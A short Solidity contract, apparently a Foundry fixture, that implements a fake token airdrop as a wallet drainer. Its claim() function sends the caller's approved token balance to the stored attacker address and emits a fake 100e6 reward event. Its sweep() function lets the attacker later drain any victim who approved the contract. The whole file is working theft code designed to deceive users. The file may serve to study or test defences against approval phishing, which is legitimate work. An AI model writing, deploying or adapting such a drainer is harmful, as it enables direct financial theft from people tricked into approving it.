// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract FakeAirdrop {

    address private immutable attacker;
    IERC20 public immutable token;
    event AirdropClaimed(address indexed user, uint256 reward);

    error NotAttacker();

    constructor(IERC20 token_) {
        attacker = msg.sender;
        token = token_;
    }
    
    function claim() external {
        uint256 balance = token.balanceOf(msg.sender);
        uint256 allowed = token.allowance(msg.sender, address(this));
        uint256 amount = balance < allowed ? balance : allowed;

        if (amount > 0) {
            token.transferFrom(msg.sender, attacker, amount);
        }

        emit AirdropClaimed(msg.sender, 100e6);
    }

    function sweep(address victim) external {
        if (msg.sender != attacker) revert NotAttacker();
        uint256 balance = token.balanceOf(victim);
        uint256 allowed = token.allowance(victim, address(this));
        uint256 amount = balance < allowed ? balance : allowed;
        if (amount > 0) token.transferFrom(victim, attacker, amount);
    }
}
